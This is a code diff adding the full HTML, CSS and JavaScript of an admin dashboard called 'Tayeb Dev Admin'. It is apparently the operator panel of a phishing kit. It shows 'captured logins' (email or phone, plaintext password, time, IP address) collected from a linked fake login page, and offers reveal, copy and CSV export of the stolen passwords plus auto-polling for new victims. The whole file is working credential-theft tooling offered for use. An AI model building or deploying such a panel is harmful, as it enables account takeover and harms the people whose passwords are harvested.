@@ -1,0 +1,796 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Tayeb Dev - Admin Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #0866e8;
+      --primary-hover: #075bd0;
+      --primary-light: #e7f0fd;
+      --bg: #f8fafc;
+      --card-bg: #ffffff;
+      --text: #0f172a;
+      --text-muted: #64748b;
+      --border: #e2e8f0;
+      --danger: #ef4444;
+      --danger-hover: #dc2626;
+      --danger-light: #fee2e2;
+      --success: #10b981;
+      --success-light: #d1fae5;
+      --radius: 14px;
+      --shadow-sm: 0 1px 3px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
+      --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.08), 0 2px 4px -1px rgba(0,0,0,0.04);
+      --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.08), 0 4px 6px -2px rgba(0,0,0,0.04);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Auth Screen (Lock screen) */
+    #auth-screen {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .auth-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 40px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: var(--shadow-lg);
+      text-align: center;
+    }
+
+    .brand-icon {
+      width: 56px;
+      height: 56px;
+      background: var(--primary);
+      color: white;
+      font-weight: 700;
+      font-size: 26px;
+      border-radius: 16px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      box-shadow: 0 6px 16px rgba(8, 102, 232, 0.3);
+    }
+
+    .auth-card h2 {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .auth-card p {
+      color: var(--text-muted);
+      font-size: 14px;
+      margin-bottom: 24px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 13px 16px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-size: 15px;
+      font-family: inherit;
+      outline: none;
+      transition: all 0.2s;
+      margin-bottom: 16px;
+    }
+
+    .input-field:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(8, 102, 232, 0.15);
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px 20px;
+      font-size: 14px;
+      font-weight: 600;
+      font-family: inherit;
+      border-radius: 10px;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-decoration: none;
+    }
+
+    .btn-primary {
+      background: var(--primary);
+      color: white;
+      width: 100%;
+    }
+
+    .btn-primary:hover {
+      background: var(--primary-hover);
+    }
+
+    .btn-secondary {
+      background: white;
+      color: var(--text);
+      border: 1.5px solid var(--border);
+    }
+
+    .btn-secondary:hover {
+      background: var(--bg);
+      border-color: #cbd5e1;
+    }
+
+    .btn-danger {
+      background: var(--danger-light);
+      color: var(--danger);
+      border: 1px solid rgba(239, 68, 68, 0.2);
+    }
+
+    .btn-danger:hover {
+      background: var(--danger);
+      color: white;
+    }
+
+    .btn-sm {
+      padding: 6px 12px;
+      font-size: 13px;
+      border-radius: 8px;
+    }
+
+    /* Dashboard Layout */
+    #dashboard-screen {
+      display: none;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    header {
+      background: var(--card-bg);
+      border-bottom: 1px solid var(--border);
+      padding: 16px 32px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .nav-title {
+      font-size: 20px;
+      font-weight: 700;
+    }
+
+    .badge-admin {
+      background: var(--primary-light);
+      color: var(--primary);
+      font-size: 12px;
+      font-weight: 600;
+      padding: 4px 10px;
+      border-radius: 20px;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .content-container {
+      max-width: 1300px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      width: 100%;
+      flex: 1;
+    }
+
+    /* Stats Grid */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 20px;
+      margin-bottom: 28px;
+    }
+
+    .stat-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px;
+      box-shadow: var(--shadow-sm);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .stat-card h3 {
+      font-size: 14px;
+      color: var(--text-muted);
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+
+    .stat-card .value {
+      font-size: 32px;
+      font-weight: 700;
+      color: var(--text);
+    }
+
+    .stat-icon {
+      width: 52px;
+      height: 52px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+    }
+
+    .stat-icon.blue { background: var(--primary-light); color: var(--primary); }
+    .stat-icon.green { background: var(--success-light); color: var(--success); }
+
+    /* Controls Bar */
+    .controls-bar {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    .search-box {
+      position: relative;
+      flex: 1;
+      max-width: 360px;
+      min-width: 240px;
+    }
+
+    .search-input {
+      width: 100%;
+      padding: 11px 16px 11px 38px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-size: 14px;
+      background: var(--card-bg);
+      outline: none;
+      transition: all 0.2s;
+    }
+
+    .search-input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(8, 102, 232, 0.12);
+    }
+
+    .search-icon {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--text-muted);
+      font-size: 14px;
+    }
+
+    .action-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    /* Table Styling */
+    .table-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-sm);
+      overflow: hidden;
+    }
+
+    .table-container {
+      overflow-x: auto;
+      width: 100%;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+    }
+
+    th {
+      background: #f8fafc;
+      padding: 16px 20px;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    td {
+      padding: 16px 20px;
+      font-size: 14px;
+      border-bottom: 1px solid var(--border);
+      vertical-align: middle;
+    }
+
+    tr:last-child td {
+      border-bottom: none;
+    }
+
+    tr:hover td {
+      background-color: #fafbfc;
+    }
+
+    .credential-cell {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-family: inherit;
+    }
+
+    .credential-val {
+      font-weight: 600;
+      letter-spacing: 0.2px;
+    }
+
+    .password-mask {
+      font-family: monospace;
+      letter-spacing: 2px;
+      background: #f1f5f9;
+      padding: 4px 8px;
+      border-radius: 6px;
+      color: #334155;
+    }
+
+    .btn-icon-tiny {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--text-muted);
+      padding: 4px;
+      border-radius: 4px;
+      font-size: 12px;
+      display: inline-flex;
+      align-items: center;
+      transition: color 0.15s;
+    }
+
+    .btn-icon-tiny:hover {
+      color: var(--primary);
+    }
+
+    .timestamp-badge {
+      font-size: 13px;
+      color: var(--text-muted);
+      white-space: nowrap;
+    }
+
+    .empty-state {
+      padding: 60px 20px;
+      text-align: center;
+      color: var(--text-muted);
+    }
+
+    .empty-state-icon {
+      font-size: 40px;
+      margin-bottom: 12px;
+      opacity: 0.6;
+    }
+
+    /* Toast Notification */
+    #toast {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: #1e293b;
+      color: white;
+      padding: 12px 20px;
+      border-radius: 10px;
+      font-size: 14px;
+      box-shadow: var(--shadow-lg);
+      transform: translateY(100px);
+      opacity: 0;
+      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      z-index: 1000;
+    }
+
+    #toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    @media (max-width: 768px) {
+      header { padding: 16px 20px; }
+      .content-container { padding: 20px 16px; }
+      .search-box { max-width: 100%; width: 100%; }
+      .controls-bar { flex-direction: column; align-items: stretch; }
+      .action-group { justify-content: flex-end; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ADMIN AUTH SCREEN -->
+  <div id="auth-screen">
+    <div class="auth-card">
+      <div class="brand-icon">T</div>
+      <h2>Tayeb Dev Admin</h2>
+      <p>Enter the master security password to access collected user logs</p>
+      <form id="admin-login-form">
+        <input 
+          type="password" 
+          id="admin-pass" 
+          class="input-field" 
+          placeholder="Enter Admin Password (e.g. admin123)" 
+          required 
+          autocomplete="current-password"
+        >
+        <button type="submit" class="btn btn-primary" id="login-btn">Unlock Dashboard</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- ADMIN DASHBOARD SCREEN -->
+  <div id="dashboard-screen">
+    <header>
+      <div class="nav-left">
+        <div class="brand-icon" style="width:36px; height:36px; font-size:18px; margin-bottom:0; border-radius:10px;">T</div>
+        <h1 class="nav-title">tayeb dev</h1>
+        <span class="badge-admin">Admin Dashboard</span>
+      </div>
+      <div class="nav-right">
+        <a href="/" target="_blank" class="btn btn-secondary btn-sm">Preview Login Page ↗</a>
+        <button class="btn btn-secondary btn-sm" id="logout-btn">Log out</button>
+      </div>
+    </header>
+
+    <div class="content-container">
+      <!-- STATS -->
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div>
+            <h3>Total Captured Logins</h3>
+            <div class="value" id="stat-total">0</div>
+          </div>
+          <div class="stat-icon blue">📊</div>
+        </div>
+        <div class="stat-card">
+          <div>
+            <h3>Today's Submissions</h3>
+            <div class="value" id="stat-today">0</div>
+          </div>
+          <div class="stat-icon green">⚡</div>
+        </div>
+      </div>
+
+      <!-- CONTROLS -->
+      <div class="controls-bar">
+        <div class="search-box">
+          <span class="search-icon">🔍</span>
+          <input type="text" id="search-input" class="search-input" placeholder="Search by email, phone...">
+        </div>
+        <div class="action-group">
+          <button class="btn btn-secondary btn-sm" id="refresh-btn">🔄 Refresh</button>
+          <button class="btn btn-secondary btn-sm" id="export-csv-btn">📥 Export CSV</button>
+          <button class="btn btn-danger btn-sm" id="clear-all-btn">🗑️ Clear All Data</button>
+        </div>
+      </div>
+
+      <!-- DATA TABLE -->
+      <div class="table-card">
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Email / Mobile Number</th>
+                <th>Password</th>
+                <th>Date & Time</th>
+                <th>IP Address</th>
+                <th style="text-align: right;">Action</th>
+              </tr>
+            </thead>
+            <tbody id="submissions-body">
+              <!-- Dynamic rows -->
+            </tbody>
+          </table>
+        </div>
+        <div id="empty-state" class="empty-state" style="display: none;">
+          <div class="empty-state-icon">📭</div>
+          <h3>No User Data Captured Yet</h3>
+          <p>When someone enters credentials on the login page, they will show up here automatically.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="toast"></div>
+
+  <script>
+    let authToken = localStorage.getItem('tayeb_admin_token') || '';
+    let submissionsCache = [];
+
+    const authScreen = document.querySelector('#auth-screen');
+    const dashboardScreen = document.querySelector('#dashboard-screen');
+    const adminLoginForm = document.querySelector('#admin-login-form');
+    const adminPassInput = document.querySelector('#admin-pass');
+    const submissionsBody = document.querySelector('#submissions-body');
+    const emptyState = document.querySelector('#empty-state');
+    const searchInput = document.querySelector('#search-input');
+    const statTotal = document.querySelector('#stat-total');
+    const statToday = document.querySelector('#stat-today');
+    const toast = document.querySelector('#toast');
+
+    // Show Toast Notification
+    function showToast(msg) {
+      toast.textContent = msg;
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 2500);
+    }
+
+    // Check existing session
+    if (authToken) {
+      verifyAndLoad();
+    }
+
+    async function verifyAndLoad() {
+      try {
+        const res = await fetch('/api/admin/verify', {
+          headers: { 'Authorization': `Bearer ${authToken}` }
+        });
+        if (res.ok) {
+          showDashboard();
+          fetchSubmissions();
+        } else {
+          logout();
+        }
+      } catch (err) {
+        logout();
+      }
+    }
+
+    // Login Form Submit
+    adminLoginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const password = adminPassInput.value.trim();
+      const loginBtn = document.querySelector('#login-btn');
+      loginBtn.disabled = true;
+      loginBtn.textContent = 'Verifying...';
+
+      try {
+        const res = await fetch('/api/admin/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ password })
+        });
+        const data = await res.json();
+
+        if (res.ok && data.success) {
+          authToken = data.token;
+          localStorage.setItem('tayeb_admin_token', authToken);
+          showDashboard();
+          fetchSubmissions();
+          showToast('Welcome to Tayeb Dev Admin');
+        } else {
+          alert(data.message || 'Incorrect password');
+        }
+      } catch (err) {
+        alert('Could not connect to server.');
+      } finally {
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Unlock Dashboard';
+      }
+    });
+
+    function showDashboard() {
+      authScreen.style.display = 'none';
+      dashboardScreen.style.display = 'flex';
+    }
+
+    function logout() {
+      authToken = '';
+      localStorage.removeItem('tayeb_admin_token');
+      dashboardScreen.style.display = 'none';
+      authScreen.style.display = 'flex';
+      adminPassInput.value = '';
+    }
+
+    document.querySelector('#logout-btn').addEventListener('click', logout);
+
+    // Fetch Submissions
+    async function fetchSubmissions() {
+      try {
+        const res = await fetch('/api/admin/submissions', {
+          headers: { 'Authorization': `Bearer ${authToken}` }
+        });
+        if (res.status === 401) {
+          logout();
+          return;
+        }
+        const data = await res.json();
+        if (data.success) {
+          submissionsCache = data.data;
+          renderSubmissions(submissionsCache);
+        }
+      } catch (err) {
+        console.error('Fetch error:', err);
+      }
+    }
+
+    // Render Submissions Table
+    function renderSubmissions(list) {
+      statTotal.textContent = submissionsCache.length;
+
+      // Count today's items
+      const todayStr = new Date().toDateString();
+      const todayCount = submissionsCache.filter(item => new Date(item.timestamp).toDateString() === todayStr).length;
+      statToday.textContent = todayCount;
+
+      if (!list || list.length === 0) {
+        submissionsBody.innerHTML = '';
+        emptyState.style.display = 'block';
+        return;
+      }
+
+      emptyState.style.display = 'none';
+      submissionsBody.innerHTML = list.map((item, index) => `
+        <tr id="row-${item.id}">
+          <td style="color:var(--text-muted); font-size:12px;">${index + 1}</td>
+          <td>
+            <div class="credential-cell">
+              <span class="credential-val">${escapeHtml(item.account)}</span>
+              <button class="btn-icon-tiny" title="Copy Email/Phone" onclick="copyText('${escapeAttr(item.account)}')">📋</button>
+            </div>
+          </td>
+          <td>
+            <div class="credential-cell">
+              <span class="password-mask" id="pass-${item.id}">••••••••</span>
+              <button class="btn-icon-tiny" title="Show/Hide Password" onclick="togglePasswordView('${item.id}', '${escapeAttr(item.password)}')">👁️</button>
+              <button class="btn-icon-tiny" title="Copy Password" onclick="copyText('${escapeAttr(item.password)}')">📋</button>
+            </div>
+          </td>
+          <td>
+            <span class="timestamp-badge">${escapeHtml(item.formattedDate || new Date(item.timestamp).toLocaleString())}</span>
+          </td>
+          <td style="color:var(--text-muted); font-size:13px;">${escapeHtml(item.ip || '127.0.0.1')}</td>
+          <td style="text-align: right;">
+            <button class="btn btn-danger btn-sm" onclick="deleteEntry('${item.id}')">Delete</button>
+          </td>
+        </tr>
+      `).join('');
+    }
+
+    // Helpers
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str).replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]));
+    }
+
+    function escapeAttr(str) {
+      if (!str) return '';
+      return String(str).replace(/'/g, "\\'").replace(/"/g, '&quot;');
+    }
+
+    window.togglePasswordView = function(id, actualPassword) {
+      const el = document.getElementById(`pass-${id}`);
+      if (el.textContent === '••••••••') {
+        el.textContent = actualPassword;
+        el.style.letterSpacing = 'normal';
+      } else {
+        el.textContent = '••••••••';
+        el.style.letterSpacing = '2px';
+      }
+    };
+
+    window.copyText = function(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        showToast('Copied to clipboard!');
+      }).catch(() => {
+        showToast('Failed to copy');
+      });
+    };
+
+    window.deleteEntry = async function(id) {
+      if (!confirm('Are you sure you want to delete this record?')) return;
+
+      try {
+        const res = await fetch(`/api/admin/submissions/${id}`, {
+          method: 'DELETE',
+          headers: { 'Authorization': `Bearer ${authToken}` }
+        });
+        const data = await res.json();
+        if (data.success) {
+          submissionsCache = submissionsCache.filter(item => item.id !== id);
+          applySearchFilter();
+          showToast('Record deleted');
+        } else {
+          alert(data.message || 'Failed to delete');
+        }
+      } catch (err) {
+        alert('Server communication error');
+      }
+    };
+
+    // Clear All
+    document.querySelector('#clear-all-btn').addEventListener('click', async () => {
+      if (!confirm('WARNING: Are you sure you want to clear ALL collected credentials? This cannot be undone.')) return;
+
+      try {
+        const res = await fetch('/api/admin/submissions', {
+          method: 'DELETE',
+          headers: { 'Authorization': `Bearer ${authToken}` }
+        });
+        const data = await res.json();
+        if (data.success) {
+          submissionsCache = [];
+          renderSubmissions([]);
+          showToast('All records cleared');
+        }
+      } catch (err) {
+        alert('Error clearing records');
+      }
+    });
+
+    // Refresh
+    document.querySelector('#refresh-btn').addEventListener('click', () => {
+      fetchSubmissions();
+      showToast('Data refreshed');
+    });
+
+    // Export CSV
+    document.querySelector('#export-csv-btn').addEventListener('click', () => {
+      window.location.href = `/api/admin/export?token=${authToken}`;
+    });
+
+    // Search filter
+    function applySearchFilter() {
+      const query = searchInput.value.toLowerCase().trim();
+      if (!query) {
+        renderSubmissions(submissionsCache);
+      } else {
+        const filtered = submissionsCache.filter(item =>
+          (item.account && item.account.toLowerCase().includes(query)) ||
+          (item.formattedDate && item.formattedDate.toLowerCase().includes(query))
+        );
+        renderSubmissions(filtered);
+      }
+    }
+
+    searchInput.addEventListener('input', applySearchFilter);
+
+    // Auto-poll every 10 seconds for new submissions
+    setInterval(() => {
+      if (authToken && dashboardScreen.style.display !== 'none') {
+        fetchSubmissions();
+      }
+    }, 10000);
+  </script>
+</body>
+</html>
